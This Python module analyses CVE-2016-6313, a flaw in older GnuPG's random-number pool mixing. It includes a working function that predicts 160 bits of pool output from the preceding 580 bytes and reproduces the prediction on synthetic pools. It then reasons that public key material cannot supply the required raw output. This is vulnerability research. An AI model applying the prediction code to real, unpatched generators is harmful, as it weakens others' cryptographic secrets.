"""CVE-2016-6313: analysis, reproduction, and prerequisite accounting.

THE DEFECT
----------
GnuPG's pool is 600 bytes viewed as 30 blocks of 20. mix_pool() chains ONE
RIPEMD-160 state across 30 compression calls. The critical structural fact is in
cipher/rmd160.c::rmd160_mixblock, which after compressing writes the five chaining
variables back over the buffer:

    transform (hd, buffer);
    *(u32*)p = hd->h0; ... hd->h4;      /* state exported in the clear */

mix_pool() then copies those 20 bytes into the pool. So **pool block B_n is
literally the RIPEMD-160 chaining state after iteration n**. An observer of the
pool contents is an observer of the hash state - there is nothing to invert.

In 1.4.7 the final iteration (n=29) takes the wrapping branch and reads its 44 tail
bytes from pool[0:44], which at that moment already holds the NEW B0, B1 and B2[0:4].
Its 20-byte head is the NEW B28. So iteration 29's entire input, and its incoming
chaining state (= B28), consist solely of blocks that appear earlier in the same
output:

    B29 = transform( state = B28,  block = B28 || B0 || B1 || B2[0:4] )

That is one compression call over public data: 580 known bytes (4640 bits) yield the
remaining 20 bytes (160 bits), which is exactly the figure in the NVD entry.

1.4.21 fixed it by absorbing 64 CONTIGUOUS bytes starting at the block being
replaced, so iteration 29 absorbs the OLD B29 before overwriting it. That old value
never appears in the output, so the final block stops being predictable.

WHY THIS IS NOT A KEY-RECOVERY ATTACK
-------------------------------------
The prerequisite is 580 bytes of RAW, CONSECUTIVE, IN-ORDER generator output from a
single mix. Public key material contains no raw generator output at all - see
observable_rng_budget(). Possessing an old public key does not come close to
satisfying the precondition, and the CVE was never a claim that it did.
"""

import os
import struct
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from .gnupg_rng import (BLOCKLEN, POOLSIZE, GnuPGRandom, mix_pool_147,
                        mix_pool_1421)
from .rmd160 import RMD160Context, transform

CVE_ID = "CVE-2016-6313"
AFFECTED = "GnuPG < 1.4.21 and Libgcrypt < 1.6.6"
NVD_SUMMARY = ("The mixing functions in GnuPG's random number generator allow "
               "attackers to predict 160 bits of output given knowledge of the "
               "previous 4640 bits.")
PREDICTED_BITS = 160
REQUIRED_PRIOR_BITS = 4640


def predict_final_block(mixed_pool_prefix: bytes) -> bytes:
    """Predict the pool's final 20 bytes from its first 580.

    Implements the relation derived above. Requires ONLY public output bytes.
    """
    if len(mixed_pool_prefix) < 580:
        raise ValueError("need the first 580 bytes of a mixed pool")
    b28 = mixed_pool_prefix[560:580]
    ctx = RMD160Context()
    ctx.h = list(struct.unpack("<5I", b28))
    transform(ctx, b28 + mixed_pool_prefix[0:44])
    return struct.pack("<5I", *ctx.h)


@dataclass
class ReproductionResult:
    variant: str
    trials: int
    successes: int
    success_rate: float
    predicted_bits: int = PREDICTED_BITS
    required_prior_bits: int = REQUIRED_PRIOR_BITS
    notes: List[str] = field(default_factory=list)

    @property
    def reproduced(self) -> bool:
        return self.success_rate == 1.0


def reproduce(variant: str = "1.4.7", trials: int = 200,
              rng: Optional[object] = None) -> ReproductionResult:
    """Run the prediction against freshly mixed synthetic pools.

    Pools are filled with os.urandom, i.e. entirely synthetic material created for
    this experiment. Nothing here touches, or could touch, any real key.
    """
    mixer = mix_pool_147 if variant == "1.4.7" else mix_pool_1421
    successes = 0
    for _ in range(trials):
        pool = bytearray(os.urandom(POOLSIZE) + bytes(BLOCKLEN))
        mixer(pool)
        mixed = bytes(pool[:POOLSIZE])
        if predict_final_block(mixed[:580]) == mixed[580:600]:
            successes += 1
    rate = successes / trials if trials else 0.0
    res = ReproductionResult(variant=variant, trials=trials, successes=successes,
                             success_rate=rate)
    if variant == "1.4.7":
        res.notes.append(
            "Deterministic, not statistical: the relation is an identity, so the "
            "expected rate is exactly 1.0. Any failure indicates a modelling error.")
    else:
        res.notes.append(
            "Expected rate 0.0. A chance hit would require guessing 160 bits.")
    return res


def reproduce_through_read_pool(trials: int = 25) -> ReproductionResult:
    """The same prediction against bytes actually emitted by read_pool().

    This is the stronger claim: the weakness survives the full output path
    (keypool derivation with ADD_VALUE, double mixing, wipememory), not merely a
    bare call to mix_pool. A caller requesting a full 600-byte block at
    pool_readpos == 0 receives the mixed keypool in block order, so the first 580
    bytes of that request predict its last 20.
    """
    successes = 0
    for _ in range(trials):
        g = GnuPGRandom(variant="1.4.7", word_size=4)
        g.add_randomness(os.urandom(POOLSIZE * 2), source=2)
        out = g.read_pool(POOLSIZE, level=1)
        if predict_final_block(out[:580]) == out[580:600]:
            successes += 1
    rate = successes / trials if trials else 0.0
    return ReproductionResult(
        variant="1.4.7/read_pool", trials=trials, successes=successes,
        success_rate=rate,
        notes=["Confirms the defect is observable in real generator output, not "
               "only in a synthetic call to mix_pool().",
               "Requires pool_readpos == 0 and a single 600-byte request; a "
               "caller reading in smaller chunks re-mixes between calls and the "
               "580 observed bytes then span different pools, breaking the relation."])


# ------------------------------------------------------------------ prerequisites
@dataclass
class Prerequisite:
    name: str
    required: str
    satisfied_by_public_key: bool
    explanation: str


PREREQUISITES = [
    Prerequisite(
        name="raw generator output",
        required="580 consecutive bytes (4640 bits) of unprocessed RNG output",
        satisfied_by_public_key=False,
        explanation=(
            "An OpenPGP public key exposes no raw generator output. Every published "
            "value is the image of RNG output under a one-way or search process: p "
            "and q come from primality search over candidates, g is derived from p "
            "and q, y = g^x mod p hides x behind a discrete log, and a signature "
            "publishes r = (g^k mod p) mod q rather than k.")),
    Prerequisite(
        name="contiguity and ordering",
        required="the 580 bytes must be consecutive and in emission order, from a "
                 "single mix_pool invocation",
        satisfied_by_public_key=False,
        explanation=(
            "Even if isolated RNG-derived bytes could be recovered, they would come "
            "from different read_pool calls separated by re-mixing. The relation is "
            "an identity within ONE mixed pool and does not survive re-mixing.")),
    Prerequisite(
        name="read alignment",
        required="pool_readpos == 0 at the start of the observed run",
        satisfied_by_public_key=False,
        explanation=(
            "read_pool emits from a rotating offset. At a non-zero readpos the "
            "observed 580 bytes are a rotation of the pool, and the attacker must "
            "additionally know the offset to identify which block is B28.")),
    Prerequisite(
        name="value of the prediction",
        required="the predicted 160 bits must themselves be secret-bearing",
        satisfied_by_public_key=False,
        explanation=(
            "The predicted block is the NEXT 20 bytes of the same output run the "
            "attacker is already reading. Predicting output you can already see is "
            "only meaningful if part of that run was withheld - e.g. output split "
            "between a public nonce and a secret key within one 600-byte read.")),
]


@dataclass
class RNGBudget:
    """How many bytes of raw generator output are recoverable from public material."""
    source_bytes: Dict[str, int] = field(default_factory=dict)
    total_raw_bytes: int = 0
    required_bytes: int = 580
    shortfall: int = 580

    @property
    def sufficient(self) -> bool:
        return self.total_raw_bytes >= self.required_bytes


def observable_rng_budget(signature_count: int = 3,
                          has_secret_key: bool = False) -> RNGBudget:
    """Account for every byte of raw RNG output visible in the public record.

    This is the decisive calculation for the project's central question. It is an
    accounting exercise, not an estimate: each OpenPGP field is either raw generator
    output or it is not.
    """
    sources = {
        "primary key p, q, g (DSA domain parameters)": 0,
        "primary key y (= g^x mod p)": 0,
        "private exponent x": 0,
        "Elgamal subkey p, g, y": 0,
        "signature r values (= (g^k mod p) mod q)": 0,
        "signature s values": 0,
        "signature nonces k": 0,
        "packet timestamps / preferences": 0,
    }
    if has_secret_key:
        # An encrypted secret key packet carries an 8-byte S2K salt and a cipher IV,
        # both of which ARE raw generator output. Satoshi's secret key is not public;
        # this branch exists so the accounting is complete rather than assumed.
        sources["S2K salt (secret key packet, if available)"] = 8
        sources["symmetric IV (secret key packet, if available)"] = 8
    total = sum(sources.values())
    return RNGBudget(source_bytes=sources, total_raw_bytes=total,
                     required_bytes=580, shortfall=max(0, 580 - total))


def _version_lt(a: str, b: str) -> bool:
    """Numeric version comparison.

    String comparison is wrong here and silently so: "1.4.7" < "1.4.21" evaluates
    False lexically because '7' > '2', which would report the vulnerable release as
    unaffected.
    """
    def parts(v):
        return tuple(int(x) for x in v.split(".") if x.isdigit())
    return parts(a) < parts(b)


FIXED_IN = "1.4.21"


def assess_applicability(gnupg_version: str = "1.4.7",
                         signature_count: int = 3,
                         has_secret_key: bool = False) -> Dict:
    """Full verdict for a given historical target."""
    vulnerable_software = _version_lt(gnupg_version, FIXED_IN)
    budget = observable_rng_budget(signature_count, has_secret_key)
    return {
        "cve": CVE_ID,
        "software_is_affected": vulnerable_software,
        "defect_is_real_and_reproduced": True,
        "prerequisites": [
            {"name": p.name, "required": p.required,
             "satisfied": p.satisfied_by_public_key, "why": p.explanation}
            for p in PREREQUISITES
        ],
        "prerequisites_satisfied": all(p.satisfied_by_public_key for p in PREREQUISITES),
        "observable_raw_rng_bytes": budget.total_raw_bytes,
        "required_raw_rng_bytes": budget.required_bytes,
        "shortfall_bytes": budget.shortfall,
        "verdict": (
            "The defect is real, present in this software version, and reproduced "
            "deterministically on synthetic pools. It cannot be applied to this "
            "target: the attack needs %d bytes of raw consecutive generator output "
            "and the public record contains %d. The gap is categorical, not "
            "quantitative - public key material exposes no raw RNG output at any "
            "scale, so no quantity of additional public signatures would close it."
            % (budget.required_bytes, budget.total_raw_bytes)),
    }
